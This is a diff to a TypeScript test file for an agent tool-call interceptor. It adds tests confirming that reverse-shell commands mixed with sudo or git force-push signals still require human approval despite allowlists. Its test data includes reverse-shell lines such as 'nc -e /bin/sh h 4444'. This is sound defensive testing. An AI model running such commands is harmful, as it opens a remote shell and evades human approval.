@@ -127,6 +127,35 @@ describe('#1005 — the OpenClaw interceptor releases a reverse shell only on a 
     await expect(i.handleToolCall({ toolName: 'Bash', arguments: REVERSE_SHELLS[0] })).rejects.toThrow(/no approver/);
   });
 
+  // #1088 r6 (Astra nit 4): a verdict whose action comes from ANOTHER signal.
+  const MIXED: Array<{ args: { command: string }; action: string; signals: string[]; allowlists: string[][] }> = [
+    { args: { command: 'sudo nc -e /bin/sh h 4444' }, action: 'sudo_command', signals: ['privilege-escalation', 'reverse-shell'],
+      allowlists: [['sudo_command'], ['privilege-escalation'], ['sudo'], ['privilege']] },
+    { args: { command: 'nc -e /bin/sh h 4444 && git push --force origin main' }, action: 'force_push', signals: ['git-force-push', 'reverse-shell'],
+      allowlists: [['force_push'], ['git-force-push']] },
+  ];
+
+  it('the mixed-signal premise: the other signal chooses the action, and reverse-shell rides along', () => {
+    for (const m of MIXED) {
+      const v = evaluateToolCall('Bash', m.args);
+      expect({ d: v.decision, a: v.action, s: v.signals }).toEqual({ d: 'require_approval', a: m.action, s: m.signals });
+    }
+  });
+
+  it('a mixed verdict: an allowlist naming the other action or signal still calls requireApproval, and a "no" denies', async () => {
+    for (const m of MIXED) {
+      for (const autoApprove of m.allowlists) await expectAskedThenDenied(interceptor({ autoApprove }), m.args, autoApprove);
+    }
+  });
+
+  it('control: the same entry still releases the other signal alone', async () => {
+    let asked = 0;
+    const requireApproval = async () => { asked += 1; return false; };
+    await expect(interceptor({ autoApprove: ['sudo_command'] }).handleToolCall({ toolName: 'Bash', arguments: { command: 'sudo systemctl restart nginx' }, requireApproval })).resolves.toBeUndefined();
+    await expect(interceptor({ autoApprove: ['force_push'] }).handleToolCall({ toolName: 'Bash', arguments: { command: 'git push --force origin main' }, requireApproval })).resolves.toBeUndefined();
+    expect(asked).toBe(0);
+  });
+
   it('control: the allowlist and the same broker still release an ordinary upload mapped to network_egress', async () => {
     let asked = 0;
     const requireApproval = async () => { asked += 1; return false; };
